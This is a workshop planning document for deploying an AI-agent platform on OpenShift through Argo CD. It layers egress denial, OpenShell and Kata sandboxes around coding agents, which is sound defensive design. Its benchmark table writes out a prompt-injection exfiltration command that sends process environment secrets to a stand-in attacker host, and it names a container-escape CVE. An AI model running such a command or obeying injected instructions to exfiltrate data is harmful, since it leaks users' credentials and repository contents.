# Field Sourced Content and the sandbox layers

Plan for the Agents-as-Staff workshop (handsonmode.ai), 12 October 2026. Two threads that turn out to be one: RHDP wants the workshop order-able through the Field Sourced Content CI, which is an Argo CD app-of-apps; the sandbox layers we want to add are all declarative too, so they land in the same chart as components with maturity flags.

Status of every product claim below was checked on 12 October against the linked source. "Observed" means seen on salamander (OpenShift 4.21.0, OVN-Kubernetes, 8 bare-metal nodes, RHCOS 9.6 kernel 5.14, default StorageClass `ocs-storagecluster-ceph-rbd`), not documentation.

## 1. What RHDP actually asked for

The reviewer's note, in the template's own terms (https://github.com/rhpds/field-sourced-content-template):

- The orderer gives the **Field Content CI** a Git repository URL. The `ocp4_workload_field_content` role creates one Argo CD Application (project `deployed`) pointing at a **Helm chart** at `chartPath` in that repository. The Argo application controller runs with cluster-admin; the template's own preflight fails the install if it does not.
- Everything is Helm. Ansible is allowed only as a **Job inside that chart** (the `examples/ansible` pattern: a Job clones your playbook repo and runs `ansible-playbook` with `kubernetes.core` against the in-cluster API; variables `cluster_domain`, `cluster_api_url`, `namespace` are injected; `extraVars` are plain strings in `values.yaml`). Argo sync waves order Helm resources and Jobs. The reviewer called running the whole install through that Job "a hack"; the documented hybrid is manifests for what is declarative, a Job for what needs API calls.
- Data back to the platform: a ConfigMap labelled `demo.redhat.com/userinfo: ""` (URLs, credentials, instructions). Health: label resources `demo.redhat.com/application`.
- The community catalog is a stub file (`name`, `repoURL`, `revision`, `chartPath`, `owner`, `requires: {virt, rhoai, aap, clusterSize}`), PR'd into `catalog/untested/` first. `requires.virt: true` is how a chart says it needs a virtualization-capable (bare-metal) cluster, which matters for Kata below.
- Per-user deployments: the Helm example ships an `ApplicationSet` template that stamps one Application per user from a `multi_user.users` list.

## 2. Where the deployer is, and the mapping

Measured in `roles/ocp4_workload_software_factory`: `operators.yml` (6 Subscriptions, CSV wait), `gitea.yml` (261 lines: users, orgs, tokens, Secrets, AppProject, ApplicationSet), `rhdh.yml` + `rhdh_gitea_templates.yml` (template mirror) are implemented. `gitops.yml`, `agent_platform.yml`, `rhoai_maas.yml`, `keycloak_users.yml`, `verify.yml` are placeholders. The platform itself is already GitOps: `agent-office/cluster/*-app.yaml` is an Argo Application per component (operator, mcp-gateway-operator, rhdh, mattermost, skills, runtime, model-connections, maas, external-secrets-operator, help-desk, …).

So "deploy natively via GitOps" is mostly re-pointing, not rewriting:

```
workshop-gitops/                      (new repo; or chart/ inside software-factory-deployer)
├── Chart.yaml, values.yaml           app-of-apps; Field Content chartPath "."
├── templates/applications.yaml       one Argo Application per enabled component, sync waves
└── components/
    ├── operators/        wave 0  Subscriptions: GitOps, Pipelines, OpenShift AI, External Secrets,
    │                             MCP gateway, agent-office-operator (CatalogSource + Subscription);
    │                             optional: sandboxed-containers-operator, agent-sandbox-operator
    ├── platform/         wave 1  the agent-office/cluster paths (operator config, mcp gateway,
    │                             rhdh, mattermost, skills, runtime, model-connections, maas)
    ├── seat-template/    wave 2  what provision-seat.py stamps today (namespaces, RBAC, quota,
    │                             NetworkPolicy, Skill CR) as a Helm template; the layer-1 egress
    │                             policy lives here
    ├── openshell/        wave 2  optional (sandbox.openshell.enabled): Agent Sandbox Operator
    │                             Subscription, SCC + binding, OpenShell OCI Helm Application
    ├── kata/             wave 2  optional (sandbox.kata.enabled, requires.virt: true): KataConfig
    ├── showroom/         wave 3  the template's showroom component pointed at
    │                             showroom-openshift-software-factory
    └── ansible-runner/   wave 4  the Job: Gitea users/orgs/tokens/webhooks, Keycloak realm and
                                  users, RHDH template mirror, seat provisioning for N users,
                                  MaaS per-user keys, userinfo ConfigMap
```

What stays in the Job is exactly what `gitea.yml`, `rhdh_gitea_templates.yml` and `provision-seat.py` already do: things that need API calls, generated secrets or waits. Everything else moves into Applications. The catalog stub for the workshop would read `requires: {virt: true, rhoai: true, clusterSize: multinode}` once Kata is in.

Questions only the RHDP team can answer (for Prakhar's prioritization call):

1. Which base cluster the Field Content CI orders: node count and size, OpenShift version (OpenShell needs 4.19 or later for Landlock; Red Hat's guide tested 4.21), and whether a bare-metal CNV cluster can be selected (for `kata`).
2. How an order-time secret reaches the chart. The template only has plaintext `extraVars`; the model provider key behind MaaS cannot sit in git.
3. Whether the Argo controller gets cluster-admin on that CI by default (the example's preflight suggests yes and prints the ClusterRoleBinding if not).

## 3. The three layers

| Layer | Products | Status (12 Oct 2026) | Prerequisites | What the attendee sees | Effort |
|---|---|---|---|---|---|
| 1. The cage: egress default-deny | NetworkPolicy, OVN-Kubernetes EgressFirewall (DNS names), namespace ACL logging | GA, GA, GA | none | The agent is asked to post the repo to an outside URL. Denied in the shell, immediately. The exception is added by pull request, the way Module 3 already handles the declared exception. | hours |
| 2. OpenShell around the agent | OpenShell (NVIDIA, Red Hat midstream images), Red Hat build of Agent Sandbox, OpenShift AI 3.5 | Developer Preview in OpenShift AI 3.5 ("uses upstream artifacts, not supported for production"); Agent Sandbox is Technology Preview | OpenShift 4.19+ (Red Hat's guide: 4.21+); Agent Sandbox Operator installed first; default StorageClass; an SCC for the sandbox service account; a token-authenticated model (MaaS) as the provider | A sandbox that starts with no egress. A blocked fetch returns `policy_denied` and an OCSF event. The agent proposes a policy change; the attendee approves it. The model credential is never inside the sandbox. | 1 day install, 1–2 days per-seat, 2 days module |
| 3. The VM boundary | OpenShift sandboxed containers 1.13 (Kata), Red Hat build of Agent Sandbox | Kata GA on bare metal, peer pods GA on AWS and Azure, nested virtualization TP; Agent Sandbox TP | OSC Operator; `KataConfig` rolls a MachineConfig and reboots workers; bare metal or peer pods | Flip one field, watch GitOps reconcile, run `uname -r` and `cat /sys/class/dmi/id/sys_vendor` and see a different kernel and "Red Hat KVM". Claim a warm sandbox and time it. | 0.5 day + a reboot window; 0.5 day operator field |

Why two layers, in one table (Red Hat Developer, 16 and 23 July 2026, OpenShift 4.21, OpenCode agent on a Gemma model):

| Attack | Kata only | OpenShell only | Both |
|---|---|---|---|
| Prompt-injection exfiltration (`curl attacker -d "$(cat /proc/self/environ)"`) | data leaked | blocked | blocked |
| CVE-2026-31431 "Copy Fail" page-cache container escape | blocked | host compromised | blocked |

That table is the gap-map row the workshop is missing. It also explains the order: layer 1 is the cheap version of OpenShell's network control; layer 2 adds process-aware policy, credentials outside the workload and events; layer 3 adds the kernel boundary nothing above it can give.

### Layer 1: the egress cage (do first)

Observed on a seat today: the AgentGateway pod runs `runc`, restricted SCC, all capabilities dropped, seccomp RuntimeDefault, no service-account token; the `seat-isolation` NetworkPolicy is ingress-only, so the agent's shell reaches any outside host and the cluster API. The Codex lane talks to `chatgpt.com` and `api.openai.com` (ConfigMap scan, 12 Oct).

What to add to `seat-policy.yaml` (then to `components/seat-template`):

- NetworkPolicy `seat-egress`: allow DNS to `openshift-dns`, the MCP gateway's namespace, the MaaS route's backing namespace (or `openshift-ingress` if the agent is pointed at the Route), Gitea's namespace for `git` over HTTPS; nothing else, and explicitly not the API server.
- EgressFirewall `default` in the seat namespace: `Allow dnsName chatgpt.com`, `Allow dnsName api.openai.com` for the Codex lane, then `Deny 0.0.0.0/0`. The MaaS lane needs no external rule.
- Namespace annotation `k8s.ovn.org/acl-logging: {"deny": "alert"}`. The audit line lands in the node's `ovn/acl-audit-log.log`; attendees cannot read node logs, so expose it through the help desk agent's `seat_*` tools instead.

Exercise text goes into Module 3 (governed tools) as "the declared exception", and the gap map (Module 8) gets the "Execution sandbox" row with the benchmark table above.

### Layer 2: OpenShell (the module worth recording)

Facts that decide the design:

- Red Hat's install guide is the opendatahub `agent-ops` repository, which the OpenShift AI 3.5 release notes point to. Its pins: OpenShift 4.21+, Red Hat build of Agent Sandbox v0.9.0 installed first, OpenShell chart `0.0.116` with midstream images `quay.io/opendatahub/odh-openshell-gateway:v0.0.116-rhaiv.0` and the matching supervisor, SQLite on a PVC (or PostgreSQL), `--set podSecurityContext.fsGroup=null --set securityContext.runAsUser=null`, and `server.auth.allowUnauthenticatedUsers=true`, which treats every caller as one trusted developer. The guide grants the `privileged` SCC to the `openshell-sandbox` service account and says test clusters only; the repository's own SCC testing shows the narrower set the sandbox pod requests: `SYS_ADMIN`, `NET_ADMIN`, `SYS_PTRACE`, `SYSLOG`, with the agent itself running with zero effective capabilities.
- NVIDIA's 0.1.x OpenShift path is capability-free and uses OIDC for the CLI, but 0.0.x to 0.1 is a coordinated rebuild (gateway, drivers, supervisors, every sandbox recreated), not an upgrade. Pin one line and stay on it for the workshop.
- OpenShell creates `agents.x-k8s.io` Sandbox pods through the Agent Sandbox controller; OpenClaw runs inside the sandbox as the workload (the AIOps quickstart `rh-ai-quickstart/aiops-sandboxed-agent-fleet` does exactly this). The privacy router gives the sandbox `https://inference.local/v1`; the gateway holds the provider token and injects it at the boundary. Register MaaS or an OpenShift AI model as the provider (`openshell provider create --type openai --credential OPENAI_API_KEY --config OPENAI_BASE_URL=…`). The Codex subscription lane does not fit this model; the OpenShell lane uses MaaS, which is what the deployer's `model_access: maas` already assumes.
- All prerequisites are in the Red Hat Operators catalog on salamander today (`agent-sandbox-operator`, `sandboxed-containers-operator`); nothing from the sandbox stack is installed yet.

Two ways to put it in the workshop:

- **2a. CLI-driven lane, no operator change.** Each seat gets its own small OpenShell gateway (StatefulSet + PVC) in the seat namespace, stamped by the seat template, reachable only from the seat's terminal through NetworkPolicy; isolation is by namespace, which the workshop already teaches, so `allowUnauthenticatedUsers=true` is acceptable. The attendee runs `openshell sandbox create --name <seat>-agent --provider maas --env OPENAI_BASE_URL=https://inference.local/v1 -- openclaw …` from the Showroom terminal (the terminal image gets the pinned CLI). The loop they see: sandbox starts with no egress; a fetch from GitHub returns `policy_denied` and an OCSF event; the agent proposes a policy; the attendee approves it in git; the retry works; `env` inside the sandbox shows no model key. Visible in the OpenShift AI dashboard too: 3.5 lists OpenShell-managed Sandbox resources per namespace.
- **2b. Operator-native.** The agent-office-operator realizes an AgentGateway as an OpenShell sandbox instead of a Deployment. That is real work against a pre-1.0 API that renamed its protocol between 0.0.x and 0.1; not now. Keep it as the stated direction in the gap map.

Recommendation: 2a, on the Red Hat-pinned 0.0.116 line, with the narrow custom SCC rather than `privileged`.

### Layer 3: Kata and Agent Sandbox

- On salamander: the OSC Operator Subscription plus a `KataConfig` (optionally with a node selector) gives the `kata` RuntimeClass on bare metal; the MachineConfig reboots the selected workers, so pick a window. The AgentGateway CRD has no `runtimeClassName` field today (pod spec is built in `agentgateway_resources.go`); adding a passthrough is small and gives the "flip one field in git" moment.
- Red Hat build of Agent Sandbox (Technology Preview; OpenShift 4.19.35+, 4.20.26+, 4.21.21+, 4.22.2+; Operator in `agent-sandbox-system`; `Sandbox`, `SandboxTemplate`, `SandboxWarmPool`, `SandboxClaim`; router selects a sandbox with `X-Sandbox-ID`, `X-Sandbox-Port`, `X-Sandbox-Namespace` headers) is the same operator layer 2 needs, so it comes for free; a warm-pool claim timed against a cold start is a good one-minute demo.
- OpenShell inside Kata on bare metal needs OpenShell's `sidecar` topology and an `nf_tables` patch to the Kata initramfs that a worker reboot erases (agent-ops guide). Not for a workshop. On an RHDP cloud cluster `kata-remote` (peer pods) avoids the patch but needs cloud credentials. Teach the benchmark table; run the two layers side by side, not nested, unless the cluster is peer pods.
- Field Content: `components/kata` behind `sandbox.kata.enabled`, and the catalog stub says `requires.virt: true`.

## 4. Sequence

1. **This week, salamander:** layer 1 in `seat-policy.yaml`, the Module 3 exercise, the gap-map row with the benchmark table. Visible result: a denial on screen and a blocked exfiltration in the audit log.
2. **This week, RHDP path:** the chart skeleton with `components/operators`, `components/showroom` and the Ansible Job running the stages that exist today; order it once through the Field Content CI so the reviewer's "as close to e2e as possible" has a first green sync. Then move the placeholder stages into Applications over the agent-office paths.
3. **Next:** layer 2a on salamander through Argo (Agent Sandbox Subscription, SCC, OpenShell OCI Helm Application, per-seat gateway in the seat template), the module, the recording.
4. **When a reboot window exists:** layer 3 (OSC + KataConfig), the operator passthrough field, the warm-pool demo.

## Sources

- Field Sourced Content template, README, `examples/ansible`, `examples/helm`, `catalog/README.md`: https://github.com/rhpds/field-sourced-content-template
- OpenShift AI 3.5 release notes, OpenShell Developer Preview and the agent deployments view (saved copy `~/redhat/bestbuy-canada-rhcl/docs/rhoai35-release_notes.txt`, lines 744 and 780)
- Red Hat agent-ops (OpenShell on OpenShift, Kata runtime guide, RHOAI inference routing, SCC requirements): https://github.com/opendatahub-io/agent-ops
- NVIDIA OpenShell: support matrix https://docs.nvidia.com/openshell/about/support-matrix.md, OpenShift install https://docs.nvidia.com/openshell/latest/kubernetes/openshift, Helm chart README https://github.com/NVIDIA/OpenShell/blob/main/deploy/helm/openshell/README.md, 0.1.0 upgrade https://docs.nvidia.com/openshell/latest/upgrade/0-1-0
- Red Hat build of Agent Sandbox (Technology Preview), OpenShift sandboxed containers 1.13 docs: https://docs.redhat.com/en/documentation/openshift_sandboxed_containers/1.13/html-single/deploying_red_hat_build_of_agent_sandbox/index
- Layered sandboxing, Red Hat Developer 16 July 2026: https://developers.redhat.com/articles/2026/07/16/layered-sandboxing-ai-agents-openshift-and-openshell
- Two sandboxes benchmark, Red Hat Developer 23 July 2026: https://developers.redhat.com/articles/2026/07/23/why-your-ai-agent-needs-two-sandboxes-benchmark-data
- Agent Sandbox on Red Hat Developer, 15 July 2026: https://developers.redhat.com/articles/2026/07/15/red-hat-build-agent-sandbox-isolated-workload-management-kubernetes
- AIOps sandboxed agent fleet quickstart (OpenClaw inside OpenShell): https://github.com/rh-ai-quickstart/aiops-sandboxed-agent-fleet
- upstreambeat.ai coverage, each linking the Red Hat primary: /news/openshift-ai-35-openshell-kernel-agent-sandboxing, /news/red-hat-openshell-process-aware-agent-sandbox-policy, /news/red-hat-agent-sandbox-openshift-tech-preview, /news/openshift-sandboxed-containers-1-13-dgx-b200-disconnected-tdx, /news/red-hat-aiops-sandboxed-agent-fleet-openshift-quickstart, /news/nvidia-openshell-01-upgrade-sequence-validation, /news/red-hat-openclaw-openshell-openshift-ai-agentops
